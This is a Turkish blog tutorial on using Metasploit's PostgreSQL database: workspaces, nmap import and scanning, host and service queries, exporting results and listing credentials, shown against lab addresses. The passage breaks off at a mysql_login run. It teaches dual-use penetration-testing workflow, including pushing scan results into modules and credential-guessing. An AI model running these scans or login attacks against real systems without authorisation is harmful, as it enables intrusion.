---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-05-13T12:42:00Z"
excerpt: Metasploit Framework içerisinde, Postgresql desteğiyle sunulan veri tabanı
  özelliği çok kullanışlıdır ve yapılacak tarama sonuçlarını bir yerde kayıt altına
  alır. Bulunan sonuçların kayıt altına alınması, sonraki adımlarda kullanılacak IP
  adresleri, Port numaraları veya Hash Dump vb. bilgilerin exploitlere aktarılmasına
  kolaylık sağlar.
guid: https://www.siberoloji.com/?p=1145
id: 1145
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF İçinde Database Kullanımı
url: /tr/msf-icinde-database-kullanimi/
---

  Metasploit Framework içerisinde, Postgresql desteğiyle sunulan veri tabanı özelliği çok kullanışlıdır ve yapılacak tarama sonuçlarını bir yerde kayıt altına alır. Bulunan sonuçların kayıt altına alınması, sonraki adımlarda kullanılacak IP adresleri, Port numaraları veya Hash Dump vb. bilgilerin exploitlere aktarılmasına kolaylık sağlar.
 

  Aşağıdaki anlatımda, Kali işletim sistemi temel alınmıştır ve komutlar Kali’de denemiştir.
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="metasploit-veri-tabanını-ayarlama">Metasploit Veri tabanını Ayarlama 
<!-- /wp:heading -->

  Öncelikle başlamamış ise postgresql başlatılmalıdır.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# systemctl start postgresql
</code></pre>
<!-- /wp:code -->

  Postgresql başladıktan sonra Veri tabanı ilk kullanıma hazırlanmalıdır. Bunun için ```msfdb init`` scriptini kullanabiliriz.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfdb init
Creating database user 'msf'
Enter password ***for *** new role: 
Enter it again: 
Creating databases 'msf' and 'msf_test'
Creating configuration file ***in***  /usr/share/metasploit-framework/config/database.yml
Creating initial database schema
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="workspace-kullanımı">Workspace Kullanımı 
<!-- /wp:heading -->

  msfconsole başladığında öncelikle&nbsp;<code>db_status</code>&nbsp;komutuyla veri tabanı bağlantısını kontrol edelim.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  db_status 
***[*** ******* ***]***  postgresql connected to msf
</code></pre>
<!-- /wp:code -->

  Veri tabanı bağlantısını sağladıktan sonra yapacağımız işleri&nbsp;***Workspace*** &nbsp;olarak ifade edilen klasörlerde kayıt altına alarak organize edebiliriz. Normal bilgisayarlarda kayıtlarımızı nasıl klasörlerde konularına göre kayıt altına alıyorsak, msfconsole içinde aynı yaklaşım geçerlidir.
 

 
<h2 class="wp-block-heading" id="workspace-listeleme">Workspace Listeleme
<!-- /wp:heading -->

  Basitçe hiçbir parametre vermeden&nbsp;<code>workspace</code>&nbsp;komutunu verdiğinizde, mevcut kayıtlı çalışma klasörleri listelenir. O an için aktif olan workspace başında * işaretiyle belirtilir.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  workspace
*******  default
  msfu
  lab1
  lab2
  lab3
  lab4
msf ***&gt;*** 
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="workspace-oluşturma-ve-silme">Workspace Oluşturma ve Silme
<!-- /wp:heading -->

  Yeni bir Worksace oluşturmak için&nbsp;<code>-a</code>&nbsp;parametresi, silme için ise&nbsp;<code>-d</code>&nbsp;parametresi kullanılır. Parametrenin ardından oluşturmak veya silmek istediğimiz Workspace adını yazmanız yeterlidir.
 


<h3 class="wp-block-heading" id="lab4-workspace-oluşturulur">lab4 workspace oluşturulur
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  workspace -a lab4
***[*** ******* ***]***  Added workspace: lab4
msf ***&gt;***  
</code></pre>
<!-- /wp:code -->


<h3 class="wp-block-heading" id="lab4-workspace-silinir">lab4 workspace silinir
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  workspace -d lab4 
***[*** ******* ***]***  Deleted workspace: lab4
msf ***&gt;***  workspace
</code></pre>
<!-- /wp:code -->


<h3 class="wp-block-heading" id="workspace-değiştirme">workspace değiştirme
<!-- /wp:heading -->

  <code>workspace</code>&nbsp;komutuyla mevcut klasörler listelendikten sonra aktif olan dışında başka bir klasöre geçmek istersek, aşağıdaki gibi&nbsp;<code>workspace</code>&nbsp;komutunun ardından geçmek istediğimiz klasörün adını yazmamız yeterlidir.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  workspace msfu
***[*** ******* ***]***  Workspace: msfu
msf ***&gt;***  workspace
  default
*******  msfu
  lab1
  lab2
  lab3
  lab4
msf ***&gt;*** 
</code></pre>
<!-- /wp:code -->


<h3 class="wp-block-heading" id="workspace-yardım">Workspace Yardım
<!-- /wp:heading -->

  Detaylı yardım için&nbsp;<code>-h</code>&nbsp;parametresini kullanabilirsiniz.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  workspace -h
Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace ***[*** name]           Switch workspace
    workspace -a ***[*** name] ...    Add workspace***(*** s***)*** 
    workspace -d ***[*** name] ...    Delete workspace***(*** s***)*** 
    workspace -D               Delete all workspaces
    workspace -r     Rename workspace
    workspace -h               Show this help information

msf ***&gt;***  
</code></pre>
<!-- /wp:code -->

  Artık yapacağınız taramalarda elde edeceğiniz sonuçlar aktif olan workspace içerisinde kayıt edilecektir. Şimdi, sonraki adım olarak veri tabanı ile ilgili kullanabileceğimiz diğer komutlara bakalım.
 

  Öncelikle, msfconsole veri tabanı ile ilgili hangi komutları bize sağlıyor ona bakalım.&nbsp;<code>msfconsole</code>&nbsp;içerisinde&nbsp;<code>help</code>&nbsp;komutu verdiğimizde veri tabanı komutları ayrı bir başlıkta aşağıdaki gibi bize gösterilir.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  help
...snip...

Database Backend Commands
***=========================*** 

    Command           Description
    -------           -----------
    creds             List all credentials ***in *** the database
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file ***(*** filetype will be auto-detected***)*** 
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts ***in *** the database
    loot              List all loot ***in *** the database
    notes             List all notes ***in *** the database
    services          List all services ***in *** the database
    vulns             List all vulnerabilities ***in *** the database
    workspace         Switch between database workspaces
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="veri-tabanı-kullanımı">Veri Tabanı Kullanımı 
<!-- /wp:heading -->

  Yukarıda,&nbsp;<code>help</code>&nbsp;komutuyla görüntülediğimiz komutları detaylı örnekleriyle görelim.
 

 
<h2 class="wp-block-heading" id="db_import">db_import
<!-- /wp:heading -->

  Bu komut, msfconsole dışında nmap ile yaptığınız tarama sonuçlarını içeri aktarmamızı sağlar. ```nmap`` taramasının çıktısını&nbsp;***xml*** &nbsp;formatında kaydetmiş olmalısınız.
 

  Aşağıdaki örnekte,&nbsp;<code>/root/msfu/nmapScan</code>&nbsp;isimli dosya, msfconsole içerisine aktarılmaktadır. Tarama dosyasında bulunan IP adresleri, portlar, servisler ve diğer tüm sonuç bilgileri artık içeri aktarılmış olacaktır.&nbsp;<code>db_import</code>&nbsp;komutunun ardından verilen&nbsp;<code>hosts</code>&nbsp;komutuyla kontrol yapılmıştır.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***   db_import /root/msfu/nmapScan 
***[*** ******* ***]***  Importing 'Nmap XML' data
***[*** ******* ***]***  Import: Parsing with 'Rex::Parser::NmapXMLStreamParser'
***[*** ******* ***]***  Importing host 172.16.194.172
***[*** ******* ***]***  Successfully imported /root/msfu/nmapScan
msf ***&gt;***  hosts

Hosts
***=====*** 

address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------         ---                ----  -------  ---------  -----  -------  ----  --------
172.16.194.172  00:0C:29:D1:62:80        Linux    Ubuntu            server         

msf ***&gt;***  
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="db_nmap">db_nmap
<!-- /wp:heading -->

  nmap tarama sonuçlarını dışarıdan içeri aktarabileceğiniz gibi&nbsp;<code>msfconsole</code>&nbsp;sayesinde, içeride de dışarı çıkmadan nmap taraması yapabilirsiniz. Bunun için&nbsp;<code>db_nmap</code>&nbsp;komutu kullanılmaktadır.&nbsp;<code>db_nmap</code>&nbsp;ile yapacağınız taramalar, otomatik olarak aktif olan&nbsp;<code>workspace</code>&nbsp;içine kayıt edilecektir.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  db_nmap -A 172.16.194.134
***[*** ******* ***]***  Nmap: Starting Nmap 5.51SVN ***(***  <a href="http://nmap.org/">http://nmap.org</a> ***)***  at 2012-06-18 12:36 EDT
***[*** ******* ***]***  Nmap: Nmap scan report ***for *** 172.16.194.134
***[*** ******* ***]***  Nmap: Host is up ***(*** 0.00031s latency***)*** .
***[*** ******* ***]***  Nmap: Not shown: 994 closed ports
***[*** ******* ***]***  Nmap: PORT     STATE SERVICE      VERSION
***[*** ******* ***]***  Nmap: 80/tcp   open  http         Apache httpd 2.2.17 ***((*** Win32***)***  mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 

...snip...

***[*** ******* ***]***  Nmap: HOP RTT     ADDRESS
***[*** ******* ***]***  Nmap: 1   0.31 ms 172.16.194.134
***[*** ******* ***]***  Nmap: OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
***[*** ******* ***]***  Nmap: Nmap ***done*** : 1 IP address ***(*** 1 host up***)***  scanned ***in *** 14.91 seconds
msf ***&gt;*** 


msf ***&gt;***  hosts

Hosts
***=====*** 

address         mac                name  os_name            os_flavor  os_sp  purpose  info  comments
-------         ---                ----  -------            ---------  -----  -------  ----  --------
172.16.194.134  00:0C:29:68:51:BB        Microsoft Windows  XP                server         
172.16.194.172  00:0C:29:D1:62:80        Linux              Ubuntu            server         

msf ***&gt;***  
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="db_export">db_export
<!-- /wp:heading -->

  Çalıştığınız bir projede yaptığınız tarama sonuçlarını dışarı aktarmak ve raporlarınızda kullanmak isteyebilirsiniz. Bunun için&nbsp;<code>db_export</code>&nbsp;komutunu bulunmaktadır.&nbsp;<code>db_export</code>&nbsp;komutuna&nbsp;<code>-f</code>&nbsp;parametresiyle beraber dosya ismini verdiğinizde, istediğiniz dosya belirttiğiniz dış klasöre aktarılır. Dışarı aktarımda iki farklı dosya çeşidi bulunur.&nbsp;<code>xml</code>&nbsp;formatında tüm bilgiler veya&nbsp;<code>pwdump</code>&nbsp;formatında kullanıcı adı ve parola vb. bilgiler.
 

  Öncelikle yardım bilgisini görelim;
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***   db_export -h
Usage:
    db_export -f  ***[*** -a***]***  ***[*** filename]
    Format can be one of: xml, pwdump
***[*** -] No output file was specified
</code></pre>
<!-- /wp:code -->

  Şimdi aktif olarak bulunduğumuz workspace içindeki bilgileri&nbsp;<code>xml</code>&nbsp;formatında dışa aktaralım.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  db_export -f xml /root/msfu/Exported.xml
***[*** ******* ***]***  Starting export of workspace msfu to /root/msfu/Exported.xml ***[***  xml ***]*** ...
***[*** ******* ***]***      ***&gt;&gt;***  Starting export of report
***[*** ******* ***]***      ***&gt;&gt;***  Starting export of hosts
***[*** ******* ***]***      ***&gt;&gt;***  Starting export of events
***[*** ******* ***]***      ***&gt;&gt;***  Starting export of services
***[*** ******* ***]***      ***&gt;&gt;***  Starting export of credentials
***[*** ******* ***]***      ***&gt;&gt;***  Starting export of web sites
***[*** ******* ***]***      ***&gt;&gt;***  Starting export of web pages
***[*** ******* ***]***      ***&gt;&gt;***  Starting export of web forms
***[*** ******* ***]***      ***&gt;&gt;***  Starting export of web vulns
***[*** ******* ***]***      ***&gt;&gt;***  Finished export of report
***[*** ******* ***]***  Finished export of workspace msfu to /root/msfu/Exported.xml ***[***  xml ***]*** ...
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="hosts">hosts
<!-- /wp:heading -->

  <code>hosts</code>&nbsp;komutu, o ana kadar yapılan taramaların sonucunda bulunan IP bilgileri, PORT bilgileri vb. bilgileri bize gösterir. Öncelikle,&nbsp;<code>hosts</code>&nbsp;komutunun yardım bilgilerini görüntüleyelim.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  hosts -h
Usage: hosts ***[***  options ***]***  ***[*** addr1 addr2 ...]

OPTIONS:
  -a,--add          Add the hosts instead of searching
  -d,--delete       Delete the hosts instead of searching
  -c     Only show the given columns ***(*** see list below***)*** 
  -h,--help         Show this help information
  -u,--up           Only show hosts which are up
  -o          Send output to a file ***in *** csv format
  -O        Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -i,--info         Change the info of a host
  -n,--name         Change the name of a host
  -m,--comment      Change the comment of a host
  -t,--tag          Add or specify a tag to a range of hosts
</code></pre>
<!-- /wp:code -->


<h3 class="wp-block-heading" id="hosts-içinde-istenen-sütunları-görüntüleme">Hosts içinde istenen sütunları görüntüleme
<!-- /wp:heading -->

  <code>hosts</code>&nbsp;komutunu tek başına kullandığınızda kayıtlı bilgiler, aşağıda listesi bulunan sütunlarda organize edilerek gösterilir.
 

  ***Kullanılabilir Sütunlar:*** &nbsp;address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags
 

  Şimdi, sadece bilgilerini kullanacağımız sütunları ve bilgileri görüntüleyelim. Bunun için&nbsp;<code>-c</code>&nbsp;parametresini ve istediğimiz sütun adlarını yazmalıyız. Aşağıdaki örnekte, address, os_flavor sütunları ve bilgileri gösterilsin istenmiştir.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  hosts -c address,os_flavor

Hosts
***=====*** 

address         os_flavor
-------         ---------
172.16.194.134  XP
172.16.194.172  Ubuntu
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="hosts-bilgilerini-modüllerde-kullanma">Hosts Bilgilerini Modüllerde Kullanma 
<!-- /wp:heading -->

  Yaptığımız taramalarda elde edilen bilgilerin tutulduğu hosts listesinden bir takım bilgileri, kullanmak istediğimiz modüllere aktarabiliriz. Yukarıda kullandığımız&nbsp;<code>hosts -c address,os_flavor</code>&nbsp;komutuyla istediğimiz sütunları görüntülemiştik. Şimdi bu listede arama yapalım ve sonuçların içerisinde “Ubuntu” geçen satırı arayalım.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  hosts -c address,os_flavor -S Linux

Hosts
***=====*** 

address         os_flavor
-------         ---------
172.16.194.172  Ubuntu

msf ***&gt;*** 
</code></pre>
<!-- /wp:code -->

  İşte kullanacağımız IP Adresini bulduk. Şimdi bir modül içerisine girelim ve modülün ihtiyacı olan değişkenlere bakalım.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf  auxiliary***(*** tcp***)***  ***&gt;***  show options

Module options ***(*** auxiliary/scanner/portscan/tcp***)*** :

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   FILTER                        no        The filter string ***for *** capturing traffic
   INTERFACE                     no        The name of the interface
   PCAPFILE                      no        The name of the PCAP capture file to process
   PORTS        1-10000          yes       Ports to scan ***(*** e.g. 22-25,80,110-900***)*** 
   RHOSTS                        yes       The target address range or CIDR identifier
   SNAPLEN      65535            yes       The number of bytes to capture
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout ***in *** milliseconds
</code></pre>
<!-- /wp:code -->

  Yukarıda çıktıda, RHOSTS değişken boş olarak görülmektedir. Buraya Remote Host IP adresinin girilmesi gerekiyor. Normalde işlemi&nbsp;<code>set RHOSTS 172.16.194.172</code>&nbsp;komutuyla girebilirsiniz. Ancak bunu birden çok modül içinde ayarlamak, her seferinde hata yapa ihtimalinizi de arttıracaktır.
 

  Bu durumda&nbsp;<code>hosts -c address,os_flavor -S Linux</code>&nbsp;komutuyla yaptığımız arama ile bulduğumuz IP adresini, sonuna&nbsp;<code>-R</code>&nbsp;parametresini ekleyerek doğrudan içinde bulunduğumuz modüle aktarabiliriz. Aşağıdaki örnekte görüldüğü gibi “Ubuntu” IP adresi direkt olarak&nbsp;<code>tcp</code>&nbsp;modülüne aktarılmıştır.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf  auxiliary***(*** tcp***)***  ***&gt;***  hosts -c address,os_flavor -S Linux -R

Hosts
***=====*** 

address         os_flavor
-------         ---------
172.16.194.172  Ubuntu

RHOSTS ***=&gt;***  172.16.194.172

msf  auxiliary***(*** tcp***)***  ***&gt;***  run

***[*** ******* ***]***  172.16.194.172:25 - TCP OPEN
***[*** ******* ***]***  172.16.194.172:23 - TCP OPEN
***[*** ******* ***]***  172.16.194.172:22 - TCP OPEN
***[*** ******* ***]***  172.16.194.172:21 - TCP OPEN
***[*** ******* ***]***  172.16.194.172:53 - TCP OPEN
***[*** ******* ***]***  172.16.194.172:80 - TCP OPEN

...snip...

***[*** ******* ***]***  172.16.194.172:5432 - TCP OPEN
***[*** ******* ***]***  172.16.194.172:5900 - TCP OPEN
***[*** ******* ***]***  172.16.194.172:6000 - TCP OPEN
***[*** ******* ***]***  172.16.194.172:6667 - TCP OPEN
***[*** ******* ***]***  172.16.194.172:6697 - TCP OPEN
***[*** ******* ***]***  172.16.194.172:8009 - TCP OPEN
***[*** ******* ***]***  172.16.194.172:8180 - TCP OPEN
***[*** ******* ***]***  172.16.194.172:8787 - TCP OPEN
***[*** ******* ***]***  Scanned 1 of 1 hosts ***(*** 100% complete***)*** 
***[*** ******* ***]***  Auxiliary module execution completed
</code></pre>
<!-- /wp:code -->

  hosts listesinde arama ile filtre yapmadan, mevcut bulunan tüm IP adreslerini de aktif olan modüle aktarabiliriz. Bu durumda&nbsp;<code>hosts</code>&nbsp;komutuna hiçbir arama ifadesi girmeden sadece&nbsp;<code>-R</code>&nbsp;parametresi vermeniz yeterli olacaktır.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf  auxiliary***(*** tcp***)***  ***&gt;***  hosts -R

Hosts
***=====*** 

address         mac                name  os_name            os_flavor  os_sp  purpose  info  comments
-------         ---                ----  -------            ---------  -----  -------  ----  --------
172.16.194.134  00:0C:29:68:51:BB        Microsoft Windows  XP                server         
172.16.194.172  00:0C:29:D1:62:80        Linux              Ubuntu            server         

RHOSTS ***=&gt;***  172.16.194.134 172.16.194.172

msf  auxiliary***(*** tcp***)***  ***&gt;***  show options

Module options ***(*** auxiliary/scanner/portscan/tcp***)*** :

   Name         Current Setting                Required  Description
   ----         ---------------                --------  -----------
   CONCURRENCY  10                             yes       The number of concurrent ports to check per host
   FILTER                                      no        The filter string ***for *** capturing traffic
   INTERFACE                                   no        The name of the interface
   PCAPFILE                                    no        The name of the PCAP capture file to process
   PORTS        1-10000                        yes       Ports to scan ***(*** e.g. 22-25,80,110-900***)*** 
   RHOSTS       172.16.194.134 172.16.194.172  yes       The target address range or CIDR identifier
   SNAPLEN      65535                          yes       The number of bytes to capture
   THREADS      1                              yes       The number of concurrent threads
   TIMEOUT      1000                           yes       The socket connect timeout ***in *** milliseconds
</code></pre>
<!-- /wp:code -->

  Yukarıda gördüğünüz gibi tüm IP adresleri RHOSTS içine aktarılmıştır. Birkaç IP adresini elle girmek zaman alıcı olmasa da yüzlerce IP adresinde bir modülü çalıştırmak istediğinizde bu özelliğe mutlaka ihtiyaç duyacaksınız.
 

  Örneğin, bir ağda tarama yaptınız ve 112 adet aktif olarak açık cihaz ve IP adresi buldunuz. Bunların hepsine&nbsp;***smb_version*** &nbsp;modülünü denemek istiyorsunuz. İşte bu noktada&nbsp;<code>hosts -R</code>&nbsp;komutu işleri çok kolaylaştıracaktır.
 

 
<h2 class="wp-block-heading" id="services">Services
<!-- /wp:heading -->

  <code>hosts</code>&nbsp;komutu taramalarda bulunan IP ve diğer bilgileri verirken,&nbsp;<code>services</code>&nbsp;komutu da bu IP adreslerinde çalışan ve keşfedilen servisleri listeler. Tabii ki&nbsp;<code>db_nmap</code>&nbsp;komutu ile servis ve versiyon taraması yapmış olmanız gerekmektedir.
 

  Öncelikle yardım bilgilerini görüntüleyelim.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  services -h

Usage: services ***[*** -h***]***  ***[*** -u***]***  ***[*** -a***]***  ***[*** -r ***]***  ***[*** -p ***&gt;*** port1,port2&gt;] ***[*** -s ***&gt;*** name1,name2&gt;] ***[*** -o ***]***  ***[*** addr1 addr2 ...]

  -a,--add          Add the services instead of searching
  -d,--delete       Delete the services instead of searching
  -c     Only show the given columns
  -h,--help         Show this help information
  -s   Search ***for *** a list of service names
  -p   Search ***for *** a list of ports
  -r      Only show ***[*** tcp|udp] services
  -u,--up           Only show services which are up
  -o          Send output to a file ***in *** csv format
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
</code></pre>
<!-- /wp:code -->

  <code>services</code>&nbsp;komutu, bilgileri aşağıdaki sütunlarda organize ederek bize gösterir.
 

  ***Kullanılabilir sütunlar:*** &nbsp;created_at, info, name, port, proto, state, updated_at
 

  <code>hosts</code>&nbsp;komutunda nasıl arama yapıyorsak&nbsp;<code>services</code>&nbsp;içinde&nbsp;<code>-c</code>&nbsp;parametresi ile sütunlarda ve&nbsp;<code>-S</code>&nbsp;parametresi ile de belirli bir ifadeyi arayabiliriz.
 


<h3 class="wp-block-heading" id="belirli-sütunlarda-arama">Belirli Sütunlarda Arama
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  services -c name,info 172.16.194.134

Services
***========*** 

host            name          info
----            ----          ----
172.16.194.134  http          Apache httpd 2.2.17 ***(*** Win32***)***  mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1 
172.16.194.134  msrpc         Microsoft Windows RPC 
172.16.194.134  netbios-ssn   
172.16.194.134  http          Apache httpd 2.2.17 ***(*** Win32***)***  mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1 
172.16.194.134  microsoft-ds  Microsoft Windows XP microsoft-ds 
172.16.194.134  mysql 
</code></pre>
<!-- /wp:code -->


<h3 class="wp-block-heading" id="belirli-sütunlarda-özel-bir-i̇fadeyi-arama">Belirli Sütunlarda Özel Bir İfadeyi Arama
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  services -c name,info -S http

Services
***========*** 

host            name  info
----            ----  ----
172.16.194.134  http  Apache httpd 2.2.17 ***(*** Win32***)***  mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1 
172.16.194.134  http  Apache httpd 2.2.17 ***(*** Win32***)***  mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1 
172.16.194.172  http  Apache httpd 2.2.8 ***(*** Ubuntu***)***  DAV/2 
172.16.194.172  http  Apache Tomcat/Coyote JSP engine 1.1 
</code></pre>
<!-- /wp:code -->


<h3 class="wp-block-heading" id="belirli-bir-portun-bulunduğu-sütunları-arama">Belirli Bir Portun Bulunduğu Sütunları Arama
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  services -c info,name -p 445

Services
***========*** 

host            info                                  name
----            ----                                  ----
172.16.194.134  Microsoft Windows XP microsoft-ds     microsoft-ds
172.16.194.172  Samba smbd 3.X workgroup: WORKGROUP   netbios-ssn
</code></pre>
<!-- /wp:code -->


<h3 class="wp-block-heading" id="belirli-bir-port-aralığında-i̇stenen-sütunları-arama">Belirli Bir Port Aralığında İstenen Sütunları Arama
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  services -c port,proto,state -p 70-81
Services
***========*** 
host           port proto state
----           ---- ----- -----
172.16.194.134 80   tcp   open
172.16.194.172 75   tcp   closed
172.16.194.172 71   tcp   closed
172.16.194.172 72   tcp   closed
172.16.194.172 73   tcp   closed
172.16.194.172 74   tcp   closed
172.16.194.172 70   tcp   closed
172.16.194.172 76   tcp   closed
172.16.194.172 77   tcp   closed
172.16.194.172 78   tcp   closed
172.16.194.172 79   tcp   closed
172.16.194.172 80   tcp   open
172.16.194.172 81   tcp  closed
</code></pre>
<!-- /wp:code -->


<h3 class="wp-block-heading" id="belirli-bir-servisin-ve-ip-adresinin-port-bilgisini-arama">Belirli Bir Servisin ve IP Adresinin Port Bilgisini Arama
<!-- /wp:heading -->

  Yukarıda bir kaç örnekte&nbsp;<code>-S</code>&nbsp;büyük S ile belli bir ifadeyi aramıştık.&nbsp;<code>-s</code>&nbsp;parametresi de özellikle servisler listesinde arama yapmayı kolaylaştırır.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  services -s http -c port 172.16.194.134
Services
***========*** 
host           port
----           ----
172.16.194.134 80
172.16.194.134 443
</code></pre>
<!-- /wp:code -->


<h3 class="wp-block-heading" id="servisler-i̇çinde-bir-ifadeyi-arama">Servisler İçinde Bir ifadeyi arama
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  services -S Unr

Services
***========*** 
host           port proto name state info
----           ---- ----- ---- ----- ----
172.16.194.172 6667 tcp   irc  open  Unreal ircd
172.16.194.172 6697 tcp   irc  open  Unreal ircd
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="csv-export">CSV Export
<!-- /wp:heading -->

  Hem&nbsp;<code>hosts</code>&nbsp;hem de&nbsp;<code>services</code>&nbsp;listelerinde kayıtlı bulunan bilgilerde yaptığımız arama sonuçlarını ekrana yazdırmak ile birlikte CSV formatında virgülle ayrılmış dosya biçiminde dışarı da aktarabilirsiniz. Aşağıda bir kaç örnek görülmektedir.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  services -s http -c port 172.16.194.134 -o /root/msfu/http.csv

***[*** ******* ***]***  Wrote services to /root/msfu/http.csv

msf ***&gt;***  hosts -S Linux -o /root/msfu/linux.csv
***[*** ******* ***]***  Wrote hosts to /root/msfu/linux.csv

msf ***&gt;***  cat /root/msfu/linux.csv
***[*** ******* ***]***  exec: cat /root/msfu/linux.csv

address,mac,name,os_name,os_flavor,os_sp,purpose,info,comments
"172.16.194.172","00:0C:29:D1:62:80","","Linux","Debian","","server","",""

msf ***&gt;***  cat /root/msfu/http.csv
***[*** ******* ***]***  exec: cat /root/msfu/http.csv

host,port
"172.16.194.134","80"
"172.16.194.134","443"
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="creds">Creds
<!-- /wp:heading -->

  <code>creds</code>&nbsp;komutu da&nbsp;<code>hosts</code>&nbsp;ve&nbsp;<code>services</code>&nbsp;komutlarına benzer olarak taramalarda elde edilen kullanıcı bilgileri ve parolaları bize gösterir. Hiçbir ek parametre girmeden&nbsp;<code>creds</code>&nbsp;komutunu verdiğinizde kayıtlı tüm kullanıcı bilgileri listelenir.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  creds

Credentials
***===========*** 

host  port  user  pass  type  active?
----  ----  ----  ----  ----  -------

***[*** ******* ***]***  Found 0 credentials.
</code></pre>
<!-- /wp:code -->

  <code>db_nmap</code>&nbsp;komutuyla yapılan aramalarda bulunan sonuçlar nasıl&nbsp;<code>hosts</code>&nbsp;ve&nbsp;<code>services</code>&nbsp;tablolarında tutuluyorsa, herhangi bir kullanıcı adı, parola bulma modülü kullandığınızda elde ettiğiniz bilgiler de&nbsp;<code>creds</code>&nbsp;tablosu içinde tutulur. Bir örnek görelim. Bu örnekte&nbsp;<code>mysql_login</code>&nbsp;modülü çalıştırılmakta ve 172.16.194.172 Ip adresinde çalışan MySql servisine login olarak oturum açma denemesi yapılmaktadır. Başarılı olunduğunda, başarılı olan kullanıcı adı ve parola bilgisi&nbsp;<code>creds</code>&nbsp;tablosuna sonradan kullanım için kayıt edilmektedir.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf  auxiliary***(*** mysql_login***)***  ***&gt;***  run

